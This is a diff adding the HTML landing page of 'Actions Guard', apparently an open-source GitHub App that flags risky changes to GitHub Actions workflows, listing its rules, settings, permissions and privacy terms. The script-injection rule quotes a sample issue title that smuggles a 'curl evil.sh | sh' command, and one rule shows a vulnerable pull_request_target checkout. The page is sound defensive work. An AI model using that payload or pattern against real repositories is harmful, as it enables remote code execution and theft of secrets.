@@ -1,0 +1,464 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Actions Guard</title>
+    <meta
+      name="description"
+      content="A GitHub App that reviews pull requests changing GitHub Actions workflows and flags the security risks they add."
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans:wght@400;500;600&display=swap"
+    />
+    <style>
+      /* Layout: one reading column; the rules as a reference list with an anchor each (PR comments link here). */
+      :root {
+        --bg: #f7f7f4;
+        --panel: #ffffff;
+        --line: #deddd6;
+        --text: #16181d;
+        --muted: #5c6070;
+        --accent: #1f6f4a;
+        --critical: #b42318;
+        --high: #c4320a;
+        --medium: #9a6700;
+        --low: #4b5563;
+        --code-bg: #efeee9;
+        --sans: "IBM Plex Sans", ui-sans-serif, system-ui, -apple-system, "Segoe UI", sans-serif;
+        --mono: "IBM Plex Mono", ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+      }
+      @media (prefers-color-scheme: dark) {
+        :root {
+          --bg: #111317;
+          --panel: #171a1f;
+          --line: #2a2e36;
+          --text: #e7e8ea;
+          --muted: #9ba1ad;
+          --accent: #5fd39a;
+          --critical: #ff7b72;
+          --high: #ffa657;
+          --medium: #e3b341;
+          --low: #a4acb9;
+          --code-bg: #1e2229;
+          color-scheme: dark;
+        }
+      }
+      * {
+        box-sizing: border-box;
+      }
+      body {
+        margin: 0;
+        background: var(--bg);
+        color: var(--text);
+        font: 16px/1.6 var(--sans);
+        padding: 48px 16px 96px;
+      }
+      main {
+        max-width: 760px;
+        margin: 0 auto;
+        display: grid;
+        gap: 56px;
+      }
+      h1,
+      h2,
+      h3 {
+        line-height: 1.2;
+        margin: 0;
+        text-wrap: balance;
+      }
+      h1 {
+        font-size: clamp(32px, 6vw, 44px);
+        font-weight: 600;
+        letter-spacing: -0.02em;
+      }
+      h2 {
+        font-size: 24px;
+        font-weight: 600;
+      }
+      h3 {
+        font: 500 17px var(--mono);
+      }
+      p {
+        margin: 0;
+      }
+      a {
+        color: var(--accent);
+        text-underline-offset: 3px;
+      }
+      code {
+        font: 14px var(--mono);
+        background: var(--code-bg);
+        padding: 1px 5px;
+        border-radius: 4px;
+      }
+      pre {
+        margin: 0;
+        font: 13.5px/1.55 var(--mono);
+        background: var(--code-bg);
+        border: 1px solid var(--line);
+        border-radius: 6px;
+        padding: 12px 14px;
+        overflow-x: auto;
+      }
+      section {
+        display: grid;
+        gap: 16px;
+      }
+      .lede {
+        font-size: 19px;
+        color: var(--muted);
+        max-width: 60ch;
+      }
+      header {
+        display: grid;
+        gap: 18px;
+      }
+      .eyebrow {
+        font: 500 13px var(--mono);
+        letter-spacing: 0.06em;
+        text-transform: uppercase;
+        color: var(--accent);
+      }
+      .actions {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 10px;
+      }
+      .button {
+        display: inline-block;
+        padding: 9px 16px;
+        border-radius: 6px;
+        border: 1px solid var(--line);
+        background: var(--panel);
+        color: var(--text);
+        text-decoration: none;
+        font-weight: 500;
+      }
+      .button.primary {
+        background: var(--accent);
+        border-color: var(--accent);
+        color: var(--bg);
+      }
+      .rule {
+        display: grid;
+        gap: 10px;
+        padding: 20px 0;
+        border-top: 1px solid var(--line);
+        scroll-margin-top: 16px;
+      }
+      .rule:target h3 {
+        color: var(--accent);
+      }
+      .rule-head {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 6px 12px;
+        align-items: baseline;
+      }
+      .sev {
+        font: 500 12px var(--mono);
+        text-transform: uppercase;
+        letter-spacing: 0.05em;
+      }
+      .critical {
+        color: var(--critical);
+      }
+      .high {
+        color: var(--high);
+      }
+      .medium {
+        color: var(--medium);
+      }
+      .low {
+        color: var(--low);
+      }
+      .pair {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 10px;
+      }
+      .pair > div {
+        min-width: 0;
+        display: grid;
+        gap: 4px;
+      }
+      .label {
+        font: 500 12px var(--mono);
+        color: var(--muted);
+      }
+      @media (max-width: 640px) {
+        .pair {
+          grid-template-columns: 1fr;
+        }
+      }
+      table {
+        border-collapse: collapse;
+        width: 100%;
+        font-size: 15px;
+      }
+      th,
+      td {
+        text-align: left;
+        padding: 8px 10px 8px 0;
+        border-bottom: 1px solid var(--line);
+        vertical-align: top;
+      }
+      .table-wrap {
+        overflow-x: auto;
+      }
+      footer {
+        color: var(--muted);
+        font-size: 14px;
+      }
+    </style>
+  </head>
+  <body>
+    <main>
+      <header>
+        <span class="eyebrow">GitHub App · open source</span>
+        <h1>Actions Guard</h1>
+        <p class="lede">
+          Reviews pull requests that change GitHub Actions workflows and flags the security risks they add –
+          before they reach your default branch. It only reports what a pull request adds, so it's quiet on
+          day one and loud when it matters.
+        </p>
+        <div class="actions">
+          <a class="button primary" href="https://github.com/apps/actions-guard">Install on GitHub</a>
+          <a class="button" href="https://github.com/maximilianfeix/actions-guard">Source code</a>
+          <a class="button" href="https://github.com/maximilianfeix/actions-guard#self-host">Self-host</a>
+        </div>
+      </header>
+
+      <section>
+        <h2>How it works</h2>
+        <p>
+          When a pull request touches <code>.github/workflows/</code>, Actions Guard reads each changed
+          workflow at the base and at the head commit, runs the rules below on both, and compares them.
+          Whatever is new is reported as a check run – with an annotation on the line – and in one comment it
+          keeps up to date. The check fails at <code>high</code> by default, so branch protection can require
+          it.
+        </p>
+      </section>
+
+      <section id="rules">
+        <h2>Rules</h2>
+        <p>Based on GitHub's own security hardening guide for Actions.</p>
+
+        <div class="rule" id="untrusted-checkout">
+          <div class="rule-head">
+            <h3>untrusted-checkout</h3>
+            <span class="sev critical">critical</span>
+          </div>
+          <p>
+            <code>pull_request_target</code> and <code>workflow_run</code> run with a write token and the
+            repository's secrets, even for pull requests from forks. Checking out the pull request's code
+            there and running anything from it – a build, tests, an install script – hands both to whoever
+            opened the pull request. This is known as a "pwn request".
+          </p>
+          <div class="pair">
+            <div>
+              <span class="label">Risky</span>
+              <pre>
+on: pull_request_target
+steps:
+  - uses: actions/checkout@v4
+    with:
+      ref: ${{ github.event.pull_request.head.sha }}
+  - run: npm install</pre>
+            </div>
+            <div>
+              <span class="label">Instead</span>
+              <pre>
+on: pull_request   # no secrets for forks
+steps:
+  - uses: actions/checkout@v4
+  - run: npm install</pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="rule" id="script-injection">
+          <div class="rule-head">
+            <h3>script-injection</h3>
+            <span class="sev high">high</span>
+          </div>
+          <p>
+            Expressions like <code>${{ github.event.issue.title }}</code> are pasted into the script before
+            the shell sees it. A title such as <code>"; curl evil.sh | sh #</code> becomes code. Covered:
+            titles and bodies of issues, pull requests, discussions, comments and reviews; commit messages and
+            authors; branch names (<code>github.head_ref</code>, <code>pull_request.head.ref</code>, …); wiki
+            page names.
+          </p>
+          <div class="pair">
+            <div>
+              <span class="label">Risky</span>
+              <pre>- run: echo "${{ github.event.issue.title }}"</pre>
+            </div>
+            <div>
+              <span class="label">Instead</span>
+              <pre>
+- env:
+    TITLE: ${{ github.event.issue.title }}
+  run: echo "$TITLE"</pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="rule" id="self-hosted-runner">
+          <div class="rule-head">
+            <h3>self-hosted-runner</h3>
+            <span class="sev high">high</span>
+          </div>
+          <p>
+            In a public repository anyone can open a pull request. A job on <code>pull_request</code> that
+            runs on a self-hosted runner executes their code on your machine – which usually keeps state
+            between jobs and can reach your network. Use GitHub-hosted runners for pull requests.
+          </p>
+        </div>
+
+        <div class="rule" id="excessive-permissions">
+          <div class="rule-head">
+            <h3>excessive-permissions</h3>
+            <span class="sev high">high</span><span class="sev medium">medium</span
+            ><span class="sev low">low</span>
+          </div>
+          <p>
+            <code>write-all</code> is high. Write access to <code>contents</code>, <code>actions</code>,
+            <code>packages</code> or <code>deployments</code> is medium – it reaches code, workflows and
+            releases. Narrower write scopes, like <code>pull-requests</code> or <code>id-token</code> for
+            trusted publishing, are low: often right, worth a look when a pull request adds them. Give each
+            job only what it needs.
+          </p>
+        </div>
+
+        <div class="rule" id="unpinned-action">
+          <div class="rule-head">
+            <h3>unpinned-action</h3>
+            <span class="sev medium">medium</span>
+          </div>
+          <p>
+            A tag like <code>@v2</code> can be moved by the action's owner – or by whoever takes over their
+            account – and the new code runs with your token and secrets. Pin third-party actions, reusable
+            workflows and <code>docker://</code> images to a full commit SHA or digest.
+            <code>actions/*</code> and <code>github/*</code> are allowed by default (see
+            <code>allow_unpinned</code>).
+          </p>
+          <pre>- uses: some-org/deploy-action@8f4b7f84bd9e2f5d0a1c9b3e6d7a8c9b0e1f2a3b # v2.1.0</pre>
+        </div>
+
+        <div class="rule" id="secrets-inherit">
+          <div class="rule-head">
+            <h3>secrets-inherit</h3>
+            <span class="sev medium">medium</span>
+          </div>
+          <p>
+            <code>secrets: inherit</code> passes every secret of the repository to the called workflow. Pass
+            only the ones it uses: <code>secrets: { token: ${{ secrets.DEPLOY_TOKEN }} }</code>.
+          </p>
+        </div>
+
+        <div class="rule" id="missing-permissions">
+          <div class="rule-head">
+            <h3>missing-permissions</h3>
+            <span class="sev low">low</span>
+          </div>
+          <p>
+            Without a <code>permissions:</code> block the token gets the repository's default, which can be
+            write access to everything. Add <code>permissions: contents: read</code> (or <code>{}</code>) at
+            the top of the workflow and widen it per job.
+          </p>
+        </div>
+
+        <div class="rule" id="curl-pipe-shell">
+          <div class="rule-head">
+            <h3>curl-pipe-shell</h3>
+            <span class="sev low">low</span>
+          </div>
+          <p>
+            <code>curl … | bash</code> runs whatever the server sends today. Download a pinned version, check
+            its checksum, then run it.
+          </p>
+        </div>
+      </section>
+
+      <section id="settings">
+        <h2>Settings</h2>
+        <p>
+          Optional, in <code>.github/actions-guard.yml</code> on the default branch. It's read from the
+          <em>base</em> of each pull request, so a pull request can't relax its own review.
+        </p>
+        <pre>
+fail_on: high            # critical, high, medium, low or never
+ignore: [curl-pipe-shell]
+allow_unpinned: [actions/*, github/*, my-org/*]</pre>
+      </section>
+
+      <section id="permissions">
+        <h2>Permissions</h2>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>Permission</th>
+                <th>Access</th>
+                <th>Used for</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>Contents</td>
+                <td>read</td>
+                <td>the workflow files at the base and head commits</td>
+              </tr>
+              <tr>
+                <td>Pull requests</td>
+                <td>write</td>
+                <td>the list of changed files, and the review comment</td>
+              </tr>
+              <tr>
+                <td>Checks</td>
+                <td>write</td>
+                <td>the check run with its annotations</td>
+              </tr>
+              <tr>
+                <td>Metadata</td>
+                <td>read</td>
+                <td>required by GitHub for every app</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <p>Events: <code>pull_request</code> only.</p>
+      </section>
+
+      <section id="privacy">
+        <h2>Privacy</h2>
+        <p>
+          Actions Guard processes the list of changed files and the workflow files of pull requests in
+          repositories where it is installed. Each webhook is handled in memory and discarded; no code, file
+          contents or personal data are stored, logged or shared. Logs hold only the delivery ID, the
+          repository and pull request number, and the outcome. There are no analytics or cookies. Uninstalling
+          the app ends all access.
+        </p>
+      </section>
+
+      <section id="support">
+        <h2>Support</h2>
+        <p>
+          Questions, bugs and feature requests:
+          <a href="https://github.com/maximilianfeix/actions-guard/issues">GitHub issues</a> or
+          <a href="mailto:contact@aquaris.dev">contact@aquaris.dev</a>. Security reports: see
+          <a href="https://github.com/maximilianfeix/actions-guard/blob/main/SECURITY.md">SECURITY.md</a>.
+        </p>
+      </section>
+
+      <footer>
+        Actions Guard is MIT licensed and not affiliated with GitHub. Made by
+        <a href="https://github.com/maximilianfeix">Maximilian Feix</a>.
+      </footer>
+    </main>
+  </body>
+</html>
